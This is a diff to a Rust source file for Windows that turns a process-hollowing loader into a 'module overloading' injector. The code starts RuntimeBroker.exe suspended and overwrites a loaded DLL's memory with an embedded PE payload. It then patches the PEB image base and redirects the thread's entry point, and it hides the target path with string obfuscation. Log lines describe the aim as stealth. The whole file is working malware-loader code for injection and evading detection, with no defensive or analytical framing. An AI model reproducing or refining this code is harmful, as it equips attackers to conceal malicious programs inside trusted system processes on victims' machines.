@@ -1,30 +1,24 @@
 #![allow(non_snake_case)]
 
-use crate::recovery::helpers::obfuscation::deobf;
-use crate::recovery::helpers::pe::{
-    IMAGE_DOS_HEADER,
-    IMAGE_NT_HEADERS64,
-    IMAGE_SECTION_HEADER,
-};
+use crate::recovery::helpers::payload::{allow_disk_fallback, get_embedded_payload};
+use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 use crate::recovery::settings::RecoveryControl;
+use crate::stack_str;
 use std::env;
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
-use tracing::{debug, error, info};
+use tracing::{debug, error, info, warn};
 use windows::Win32::System::Diagnostics::Debug::{
-    CONTEXT,
-    CONTEXT_FLAGS,
-    GetThreadContext,
-    SetThreadContext,
-    WriteProcessMemory,
+    CONTEXT, CONTEXT_FLAGS, GetThreadContext, SetThreadContext, WriteProcessMemory,
 };
-use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, VirtualAllocEx};
+use windows::Win32::System::Memory::{
+    MEM_COMMIT, MEM_RESERVE, PAGE_PROTECTION_FLAGS, VirtualAllocEx, VirtualProtectEx,
+};
+use windows::Win32::System::ProcessStatus::{
+    K32EnumProcessModules, K32GetModuleInformation, MODULEINFO,
+};
 use windows::Win32::System::Threading::{
-    CREATE_SUSPENDED,
-    CreateProcessW,
-    PROCESS_INFORMATION,
-    ResumeThread,
-    STARTUPINFOW,
+    CREATE_SUSPENDED, CreateProcessW, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW,
 };
 use windows::core::{PCWSTR, PWSTR};
 
@@ -33,9 +27,6 @@ pub struct IMAGE_BASE_RELOCATION {
     pub virtual_address: u32,
     pub size_of_block: u32,
 }
-
-const CONTEXT_AMD64: u32 = 0x100000;
-const CONTEXT_AMD64_FULL: u32 = CONTEXT_AMD64 | 0x1 | 0x2 | 0x4;
 
 const IMAGE_REL_BASED_DIR64: u16 = 10;
 const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
@@ -51,38 +42,56 @@ pub async fn perform_hollowing() -> bool {
         return false;
     }
 
-    info!("attempting process hollowing for stealth");
+    info!("attempting module overloading for stealth");
 
-    let target_str = deobf(&[
-        0xFE, 0x87, 0xE1, 0xEA, 0xD4, 0xD3, 0xD9, 0xD2, 0xCA, 0xCE, 0xE1, 0xEE, 0xC4, 0xCE, 0xC9,
-        0xD8, 0xD0, 0x8E, 0x8F, 0xE1, 0xEF, 0xC8, 0xD3, 0xC9, 0xD4, 0xD0, 0xD8, 0xFF, 0xCF, 0xD2,
-        0xD6, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
-    ]);
+    let target_str = stack_str!(
+        'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3',
+        '2', '\\', 'R', 'u', 'n', 't', 'i', 'm', 'e', 'B', 'r', 'o', 'k', 'e', 'r', '.', 'e', 'x',
+        'e'
+    );
     let target = &target_str;
-    
-    let Ok(current_exe_path) = env::current_exe() else {
-        return false;
-    };
-    let Ok(payload_bytes) = std::fs::read(current_exe_path) else {
-        return false;
+
+    let payload_bytes = if let Some(bytes) = get_embedded_payload() {
+        debug!("using embedded payload from memory (stealthy)");
+        bytes
+    } else {
+        if !allow_disk_fallback() {
+            error!("embedded payload missing and disk fallback is disabled");
+            return false;
+        }
+
+        warn!("falling back to disk read for payload (noisy)");
+        let Ok(current_exe_path) = env::current_exe() else {
+            return false;
+        };
+        match std::fs::read(&current_exe_path) {
+            Ok(bytes) => bytes,
+            Err(e) => {
+                error!("failed to read payload from disk: {}", e);
+                return false;
+            }
+        }
     };
 
-    match run_pe(&payload_bytes, target) {
+    match run_overloaded(&payload_bytes, target) {
         Ok(_) => {
             info!(
-                "successfully hollowed into {}, signaling for exit",
+                "successfully overloaded into {}, signaling for exit",
                 target
             );
             true
         }
         Err(e) => {
-            error!("process hollowing failed: {}", e);
+            error!("module overloading failed: {}", e);
             false
         }
     }
 }
 
-pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub fn run_overloaded(
+    payload_bytes: &[u8],
+    target_path: &str,
+) -> Result<(), Box<dyn std::error::Error>> {
     let mut payload_bytes = payload_bytes.to_vec();
     unsafe {
         let mut si: STARTUPINFOW = std::mem::zeroed();
@@ -93,9 +102,7 @@ pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std
             .encode_wide()
             .chain(Some(0))
             .collect();
-            
-        // For general usage, we don't necessarily pass arguments. 
-        // If we want to mimic the target's CLI, we could, but passing just the path is safer/simpler for generic loaders.
+
         let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\"", target_path))
             .encode_wide()
             .chain(Some(0))
@@ -117,50 +124,80 @@ pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std
 
         let _pi_guard = ProcessInformationGuard(pi);
 
-        let mut context: CONTEXT = std::mem::zeroed();
-
-        #[cfg(target_arch = "x86_64")]
-        {
-            context.ContextFlags = CONTEXT_FLAGS(CONTEXT_AMD64_FULL);
-            GetThreadContext(pi.hThread, &mut context)
-                .map_err(|e| format!("failed to get context: {}", e))?;
-        }
-
         let dos_header = &*(payload_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
-        if dos_header.e_magic != 0x5A4D {
-            // "MZ"
-            return Err("invalid DOS header".into());
-        }
-
         let nt_headers = &*(payload_bytes.as_ptr().add(dos_header.e_lfanew as usize)
             as *const IMAGE_NT_HEADERS64);
-        if nt_headers.signature != 0x4550 {
-            // "PE\0\0"
-            return Err("invalid NT headers".into());
-        }
+        let payload_size = nt_headers.optional_header.size_of_image as usize;
 
-        // Stealth improvement: Do NOT unmap the original image (NtUnmapViewOfSection).
-        // Instead, allocate a new region and let the relocation logic handle the base change.
-        // We will then update the PEB's ImageBaseAddress to point to our new location.
-        let remote_image_base = VirtualAllocEx(
+        let mut h_modules = [windows::Win32::Foundation::HMODULE::default(); 1024];
+        let mut cb_needed = 0;
+        K32EnumProcessModules(
             pi.hProcess,
-            None,
-            nt_headers.optional_header.size_of_image as usize,
-            MEM_COMMIT | MEM_RESERVE,
-            windows::Win32::System::Memory::PAGE_READWRITE,
-        );
+            h_modules.as_mut_ptr(),
+            std::mem::size_of_val(&h_modules) as u32,
+            &mut cb_needed,
+        )
+        .ok()
+        .map_err(|e| e.to_string())?;
 
-        if remote_image_base.is_null() {
-            return Err("failed to allocate memory in target process".into());
+        let count = cb_needed as usize / std::mem::size_of::<windows::Win32::Foundation::HMODULE>();
+        let mut target_base = std::ptr::null_mut();
+
+        for i in 0..count {
+            let mut mod_info = MODULEINFO::default();
+            K32GetModuleInformation(
+                pi.hProcess,
+                h_modules[i],
+                &mut mod_info,
+                std::mem::size_of::<MODULEINFO>() as u32,
+            )
+            .ok()
+            .map_err(|e| e.to_string())?;
+
+            if mod_info.SizeOfImage as usize >= payload_size {
+                let mut path_buf = [0u16; 1024];
+                let len = windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW(
+                    pi.hProcess,
+                    h_modules[i],
+                    &mut path_buf,
+                );
+                let path = String::from_utf16_lossy(&path_buf[..len as usize]).to_lowercase();
+
+                if !path.contains("ntdll.dll")
+                    && !path.contains("kernel32.dll")
+                    && !path.contains("kernelbase.dll")
+                {
+                    target_base = mod_info.lpBaseOfDll;
+                    debug!(target_dll = %path, size = mod_info.SizeOfImage, "found target DLL for overloading");
+                    break;
+                }
+            }
         }
 
-        let delta = remote_image_base as isize - nt_headers.optional_header.image_base as isize;
+        if target_base.is_null() {
+            target_base = VirtualAllocEx(
+                pi.hProcess,
+                None,
+                payload_size,
+                MEM_COMMIT | MEM_RESERVE,
+                windows::Win32::System::Memory::PAGE_READWRITE,
+            );
+        }
+
+        if target_base.is_null() {
+            return Err("failed to find or allocate memory in target process".into());
+        }
+
+        let delta = target_base as isize - nt_headers.optional_header.image_base as isize;
         if delta != 0 {
             let reloc_dir =
                 &nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
             if reloc_dir.size > 0 {
-                let mut current_reloc_offset =
-                    rva_to_offset(reloc_dir.virtual_address, nt_headers, payload_bytes.as_ptr())?;
+                let mut current_reloc_offset = rva_to_offset(
+                    reloc_dir.virtual_address,
+                    nt_headers,
+                    payload_bytes.as_ptr(),
+                )?;
                 let max_reloc_offset = current_reloc_offset + reloc_dir.size as usize;
 
                 while current_reloc_offset < max_reloc_offset {
@@ -198,14 +235,24 @@ pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std
             }
         }
 
+        let mut old_prot = PAGE_PROTECTION_FLAGS::default();
+        VirtualProtectEx(
+            pi.hProcess,
+            target_base,
+            payload_size,
+            windows::Win32::System::Memory::PAGE_READWRITE,
+            &mut old_prot,
+        )
+        .map_err(|e| e.to_string())?;
+
         WriteProcessMemory(
             pi.hProcess,
-            remote_image_base,
+            target_base,
             payload_bytes.as_ptr() as *const _,
             nt_headers.optional_header.size_of_headers as usize,
             None,
         )
-        .map_err(|e| format!("failed to write headers: {}", e))?;
+        .map_err(|e| e.to_string())?;
 
         let section_header_ptr = (payload_bytes
             .as_ptr()
@@ -214,8 +261,7 @@ pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std
         for i in 0..nt_headers.file_header.number_of_sections {
             let section = &*section_header_ptr.add(i as usize);
             if section.size_of_raw_data > 0 {
-                let remote_section_dest = (remote_image_base as usize
-                    + section.virtual_address as usize)
+                let remote_section_dest = (target_base as usize + section.virtual_address as usize)
                     as *mut std::ffi::c_void;
                 let local_section_src = payload_bytes
                     .as_ptr()
@@ -229,70 +275,55 @@ pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std
                     section.size_of_raw_data as usize,
                     None,
                 )
-                .map_err(|e| format!("failed to write section {}: {}", i, e))?;
+                .map_err(|e| e.to_string())?;
             }
         }
-
-        use windows::Win32::System::Memory::{
-            PAGE_EXECUTE_READ,
-            PAGE_PROTECTION_FLAGS,
-            PAGE_READONLY,
-            VirtualProtectEx,
-        };
-
-        let mut old_prot = PAGE_PROTECTION_FLAGS::default();
-        let _ = VirtualProtectEx(
-            pi.hProcess,
-            remote_image_base,
-            nt_headers.optional_header.size_of_headers as usize,
-            PAGE_READONLY,
-            &mut old_prot,
-        );
 
         for i in 0..nt_headers.file_header.number_of_sections {
             let section = &*section_header_ptr.add(i as usize);
             if section.size_of_raw_data > 0 {
-                let remote_section_dest = (remote_image_base as usize
-                    + section.virtual_address as usize)
+                let remote_section_dest = (target_base as usize + section.virtual_address as usize)
                     as *mut std::ffi::c_void;
                 let is_executable = (section.characteristics & 0x20000000) != 0;
                 let is_writable = (section.characteristics & 0x80000000) != 0;
 
                 let prot = if is_executable {
-                    PAGE_EXECUTE_READ
+                    windows::Win32::System::Memory::PAGE_EXECUTE_READ
                 } else if is_writable {
                     windows::Win32::System::Memory::PAGE_READWRITE
                 } else {
-                    PAGE_READONLY
+                    windows::Win32::System::Memory::PAGE_READONLY
                 };
+                let mut temp = PAGE_PROTECTION_FLAGS::default();
                 let _ = VirtualProtectEx(
                     pi.hProcess,
                     remote_section_dest,
                     section.size_of_raw_data as usize,
                     prot,
-                    &mut old_prot,
+                    &mut temp,
                 );
             }
         }
+
+        let mut context: CONTEXT = std::mem::zeroed();
+        context.ContextFlags = CONTEXT_FLAGS(0x100000 | 0x1 | 0x2 | 0x4); // CONTEXT_AMD64_FULL
+        GetThreadContext(pi.hThread, &mut context).map_err(|e| e.to_string())?;
 
         #[cfg(target_arch = "x86_64")]
         {
             let peb_base = context.Rdx;
             let image_base_offset = peb_base + 0x10;
-
             WriteProcessMemory(
                 pi.hProcess,
                 (image_base_offset) as *const _,
-                &remote_image_base as *const _ as *const _,
+                &target_base as *const _ as *const _,
                 std::mem::size_of::<usize>(),
                 None,
-            )?;
-
+            )
+            .map_err(|e| e.to_string())?;
             context.Rcx =
-                remote_image_base as u64 + nt_headers.optional_header.address_of_entry_point as u64;
-
-            SetThreadContext(pi.hThread, &context)
-                .map_err(|e| format!("failed to set context: {}", e))?;
+                target_base as u64 + nt_headers.optional_header.address_of_entry_point as u64;
+            SetThreadContext(pi.hThread, &context).map_err(|e| e.to_string())?;
         }
 
         ResumeThread(pi.hThread);
